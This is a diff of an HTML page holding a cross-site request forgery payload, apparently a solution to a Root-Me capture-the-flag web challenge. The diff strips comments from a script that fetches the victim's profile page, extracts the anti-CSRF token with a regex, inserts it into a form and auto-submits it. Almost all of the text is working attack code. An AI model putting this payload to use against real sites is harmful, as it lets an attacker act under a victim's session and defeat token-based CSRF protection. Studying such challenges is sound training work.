@@ -100,19 +100,13 @@ Comment:
             <button type="submit">Submit</button>
         </form>
         <script>
-            // Create a "GET" Request 
             var getRequest = new XMLHttpRequest();
             getRequest.open("GET", "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile", false);
-
-            // Send it to server.
             getRequest.send();
 
-            // Use regex to get the token from admin; Our token is a hash having a fixed value of 32 characters (256 bits)
             var tokenAdmin = getRequest.response.match(/[qwertyuiopasdfghjklzxcvbnm1234567890]{32}/)[0];
 
-            // Change the value of token in the form to admin'token for submitting
             document.getElementById('token').value = tokenAdmin;
-            // Auto submit the form 
             document.getElementById('profile').submit();
         </script>
     </body>
